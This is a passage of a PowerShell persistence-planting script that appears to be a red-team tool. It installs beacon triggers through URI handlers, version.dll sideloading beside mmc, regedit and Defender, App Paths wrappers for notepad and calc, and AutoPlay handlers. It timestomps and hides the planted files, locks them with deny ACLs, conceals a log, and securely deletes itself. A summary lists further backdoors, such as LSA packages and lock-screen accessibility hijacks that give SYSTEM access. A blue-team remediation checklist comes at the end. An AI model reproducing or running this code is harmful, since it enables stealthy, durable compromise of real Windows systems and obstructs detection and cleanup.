        Add-PlantLog -Path $protoKey -Mechanism "C5:URIHandler"
        Write-Success "C5 URI handler: windowsdiag:// → beacon"
        Write-Info    "  Fires when any app opens a windowsdiag:// URL (browser, email client, etc.)"
    } catch { Write-Warn "C5 URI handler failed: $_" }

    # ─── C6: DLL Sideload next to common admin tools (T1574.001) ─────────────────
    Write-Section "C6 — DLL Sideloading (T1574.001)"
    try {
        # These executables load version.dll via search order — plant ours alongside them
        $sideloadTargets = @(
            "$env:SystemRoot\System32",                   # mmc.exe, regedit.exe, taskmgr.exe, eventvwr.exe
            "C:\Program Files\Windows Defender"           # MpCmdRun.exe
        )
        $c6ok = 0
        foreach ($targetDir in $sideloadTargets) {
            if (Test-Path $targetDir) {
                # Only plant if version.dll does NOT already exist there (avoid overwriting real DLL)
                $vDest = Join-Path $targetDir "version.dll"
                if (-not (Test-Path $vDest)) {
                    $r = Copy-Stealth -Source $SessionFile -Destination $vDest
                    if ($r) { Add-PlantLog -Path $r -Mechanism "C6:DLLSideload"; $c6ok++ }
                } else {
                    Write-Warn "  Skipping $targetDir (version.dll already exists)"
                }
            }
        }

        # Also plant alongside known third-party tool directories if they exist
        @(
            "C:\Tools",
            "C:\SysinternalsSuite",
            "C:\Windows\CCM"
        ) | ForEach-Object {
            if (Test-Path $_) {
                $vDest = Join-Path $_ "version.dll"
                if (-not (Test-Path $vDest)) {
                    $r = Copy-Stealth -Source $SessionFile -Destination $vDest
                    if ($r) { Add-PlantLog -Path $r -Mechanism "C6:DLLSideload:tools"; $c6ok++ }
                }
            }
        }
        Write-Success "C6 DLL sideload: $c6ok version.dll copies planted"
        Write-Info    "  Fires when admin opens mmc.exe, regedit.exe, taskmgr.exe — session DLL loads"
    } catch { Write-Warn "C6 DLL sideload failed: $_" }

    # ─── C7: App Paths Wrapping (T1574.010) ──────────────────────────────────────
    Write-Section "C7 — App Paths Wrapping (T1574.010)"
    try {
        $appPathsBase = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths"
        $wrapTargets  = @("notepad.exe","calc.exe","mspaint.exe","write.exe","mmc.exe")
        $c7ok = 0
        foreach ($t in $wrapTargets) {
            try {
                $apKey = "$appPathsBase\$t"
                if (Test-Path $apKey) {
                    $origPath = (Get-ItemProperty $apKey -ErrorAction Stop)."(Default)"
                    if (-not $origPath) {
                        Write-Warn "  AppPaths [$t]: no (Default) value — skipping"
                    } elseif ($origPath -notlike "*$script:PrimaryBeacon*") {
                        # Write a wrapper batch to inf dir
                        $baseName  = $t.Replace(".exe","")
                        $wrapBat   = "$env:SystemRoot\inf\${baseName}_wrap.bat"
                        # Strip any surrounding quotes from $origPath before embedding in our own quotes
                        $cleanOrig = $origPath.Trim('"').Trim("'")
                        $batBody   = "@echo off`r`nstart /B powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`"`r`nstart `"`" `"$cleanOrig`" %*"
                        [System.IO.File]::WriteAllText($wrapBat, $batBody, [System.Text.Encoding]::ASCII)
                        Set-StealthAttributes -Path $wrapBat
                        Invoke-Timestomp      -Path $wrapBat

                        Set-ItemProperty -Path $apKey -Name "(Default)" -Value $wrapBat -Force
                        Add-PlantLog -Path $apKey -Mechanism "C7:AppPaths:$t"
                        $c7ok++
                    }
                }
            } catch { Write-Warn "  AppPaths [$t]: $_" }
        }
        Write-Success "C7 App Paths: $c7ok executables wrapped (notepad/calc/mspaint/write/mmc)"
        Write-Info    "  Fires when user launches these apps via Start/Run/ShellExecute (not direct path)"
    } catch { Write-Warn "C7 App Paths failed: $_" }

    # ─── C8: AutoPlay Handler Registration ───────────────────────────────────────
    Write-Section "C8 — AutoPlay Handler (USB/media insert)"
    try {
        $apHandlerKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AutoPlayHandlers\Handlers\WindowsDiagnosticHandler"
        if (-not (Test-Path $apHandlerKey)) { New-Item -Path $apHandlerKey -Force | Out-Null }
        Set-ItemProperty $apHandlerKey "Action"          "Run Windows Diagnostic Tool"         -Force
        Set-ItemProperty $apHandlerKey "Provider"        "Microsoft Windows"                   -Force
        Set-ItemProperty $apHandlerKey "InvokeProgID"    "windowsdiag"                         -Force  # reuse C5 handler
        Set-ItemProperty $apHandlerKey "InvokeVerb"      "open"                                -Force
        Set-ItemProperty $apHandlerKey "DefaultIcon"     "$env:SystemRoot\System32\shell32.dll,21" -Force

        $evtHandlerBase = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AutoPlayHandlers\EventHandlers"
        foreach ($evt in @("PlayCDAudioOnArrival","StorageOnArrival","MixedContentOnArrival","HandleVideoFilesOnArrival")) {
            try {
                $evtPath = "$evtHandlerBase\$evt"
                if (-not (Test-Path $evtPath)) { New-Item -Path $evtPath -Force | Out-Null }
                Set-ItemProperty $evtPath -Name "WindowsDiagnosticHandler" -Value "" -Force
                Add-PlantLog -Path $evtPath -Mechanism "C8:AutoPlay:$evt"
            } catch { Write-Warn "  AutoPlay [$evt]: $_" }
        }
        Write-Success "C8 AutoPlay: WindowsDiagnosticHandler registered for USB/CD/mixed content events"
    } catch { Write-Warn "C8 AutoPlay failed: $_" }

} # end SkipInteractive

# ── 8. Final timestomp sweep and ACL hardening ────────────────────────────────────
Write-Section "D — Final Timestomp Sweep and ACL Hardening"
$dOk = 0
foreach ($entry in $script:PlantLog) {
    if (Test-Path $entry.Path -PathType Leaf) {
        Invoke-Timestomp -Path $entry.Path
        try {
            & icacls.exe $entry.Path /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1 | Out-Null
            & icacls.exe $entry.Path /deny "BUILTIN\Users:(RX)" 2>&1 | Out-Null
            $dOk++
        } catch {}
    }
}
Write-Success "D: ACL hardened $dOk planted files (SYSTEM:FullControl, Users:DenyRX)"

# ── 9. Write plant log ────────────────────────────────────────────────────────────
Write-Section "E — Writing Plant Log"
$logDir  = "$env:SystemRoot\System32\spool\PRINTERS"
$logPath = "$logDir\.pe_plantlog.csv"
try {
    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory $logDir -Force | Out-Null }
    $script:PlantLog | Export-Csv -Path $logPath -NoTypeInformation -Force
    Set-StealthAttributes -Path $logPath
    Invoke-Timestomp      -Path $logPath
    Write-Success "E: Plant log written to $logPath ($($script:PlantLog.Count) entries)"
} catch { Write-Warn "E: Plant log write failed: $_" }

# ── 10. Self-clean ────────────────────────────────────────────────────────────────
if ($SelfClean) {
    Write-Section "F — Self-Cleaning Planter Script"
    $selfPath = $MyInvocation.MyCommand.Path
    if ($selfPath -and (Test-Path $selfPath -PathType Leaf)) {
        try {
            $len = (Get-Item $selfPath -Force).Length
            $buf = [byte[]]::new($len)
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($buf)
            [System.IO.File]::WriteAllBytes($selfPath, $buf)
            Remove-Item $selfPath -Force
            Write-Success "F: Planter self-deleted: $selfPath"
        } catch { Write-Warn "F: Self-clean failed: $_" }
    }
}

# ── 11. Summary ───────────────────────────────────────────────────────────────────
Write-Host ""
Write-Warn "================================================================"
Write-Warn " Plant Everywhere — Complete"
Write-Warn "================================================================"
$totalFiles = ($script:PlantLog | Where-Object { $_.Mechanism -like "MassPlant*" }).Count
$totalMech  = ($script:PlantLog | Where-Object { $_.Mechanism -notlike "MassPlant*" }).Count
Write-Host ""
Write-Success "Mass plant      : $totalFiles files across filesystem"
Write-Success "Persistence mech: $totalMech triggers installed"
Write-Host ""
Write-Host "  [A]  Mass plant          $totalFiles files in $($drops.Count) locations" -ForegroundColor Cyan
Write-Host "  [B1] PS Profiles         All-users + per-user profile.ps1" -ForegroundColor Cyan
Write-Host "  [B2] MprLogonScript      $env:SystemRoot\System32\wbem\mprnotify.bat" -ForegroundColor Cyan
Write-Host "  [B3] SilentProcessExit   svchost.exe IFEO GlobalFlag=0x200 (fires constantly)" -ForegroundColor Cyan
Write-Host "  [B4] W32Time DLL         HKLM\...\W32Time\TimeProviders\NTPClientExt" -ForegroundColor Cyan
Write-Host "  [B5] LSA AuthPackage     wbemcore_ntlm.dll in System32 (requires reboot)" -ForegroundColor Cyan
Write-Host "  [B6] Screensaver         diag_saver.scr — fires after 60s idle" -ForegroundColor Cyan
Write-Host "  [B7] PATH Hijack         $env:SystemRoot\System32\wbem\bin prepended to PATH" -ForegroundColor Cyan
Write-Host "  [C1] AccessIFEO          Shift x5 / Win+U / Win+Enter at lockscreen → SYSTEM" -ForegroundColor Yellow
Write-Host "  [C2] File Assoc          .txt/.log/.cfg/.ini open → beacon fires first" -ForegroundColor Yellow
Write-Host "  [C3] Context Menu        Shift+right-click any file → WindowsDiagnosticsExt" -ForegroundColor Yellow
Write-Host "  [C4] SendTo              Right-click → Send To → Windows Diagnostic Tool" -ForegroundColor Yellow
Write-Host "  [C5] URI Handler         windowsdiag:// scheme registered" -ForegroundColor Yellow
Write-Host "  [C6] DLL Sideload        version.dll next to mmc/regedit/taskmgr/Defender" -ForegroundColor Yellow
Write-Host "  [C7] App Paths           notepad/calc/mspaint/write/mmc wrapped" -ForegroundColor Yellow
Write-Host "  [C8] AutoPlay            USB/disc insert → Windows Diagnostic Handler" -ForegroundColor Yellow
Write-Host ""
Write-Warn "================================================================"
Write-Warn " BLUE TEAM REMEDIATION CHECKLIST"
Write-Warn "================================================================"
Write-Host "  1. Search Hidden+System files in all drop dirs listed above" -ForegroundColor Red
Write-Host "  2. Audit PowerShell profile.ps1 files (all users, all hosts)" -ForegroundColor Red
Write-Host "  3. Remove HKLM\...\Winlogon\UserInitMprLogonScript and mprnotify.bat" -ForegroundColor Red
Write-Host "  4. Clear HKLM\...\IFEO\svchost.exe GlobalFlag and SilentProcessExit key" -ForegroundColor Red
Write-Host "  5. Delete HKLM\...\W32Time\TimeProviders\NTPClientExt" -ForegroundColor Red
Write-Host "  6. Remove wbemcore_ntlm from LSA Authentication Packages + delete DLL" -ForegroundColor Red
Write-Host "  7. Remove SCRNSAVE.EXE screensaver reg value from all user hives" -ForegroundColor Red
Write-Host "  8. Remove $env:SystemRoot\System32\wbem\bin from system PATH" -ForegroundColor Red
Write-Host "  9. Clear IFEO debugger on sethc/utilman/osk/magnify/narrator" -ForegroundColor Red
Write-Host " 10. Revert HKLM\Classes\txtfile/logfile/cfgfile/inifile shell open commands" -ForegroundColor Red
Write-Host " 11. Remove HKLM\Classes\AllFileSystemObjects\shell\WindowsDiagnosticsExt" -ForegroundColor Red
Write-Host " 12. Delete SendTo .lnk files for all users" -ForegroundColor Red
Write-Host " 13. Remove HKLM\Classes\windowsdiag URI handler" -ForegroundColor Red
Write-Host " 14. Delete planted version.dll files from System32/Defender/Tools dirs" -ForegroundColor Red
Write-Host " 15. Restore original App Paths for notepad/calc/mspaint/write/mmc" -ForegroundColor Red
Write-Host " 16. Remove AutoPlay handler WindowsDiagnosticHandler from all event types" -ForegroundColor Red
Write-Host "  * Plant log: $logPath (if not self-cleaned)" -ForegroundColor Red
Write-Host ""
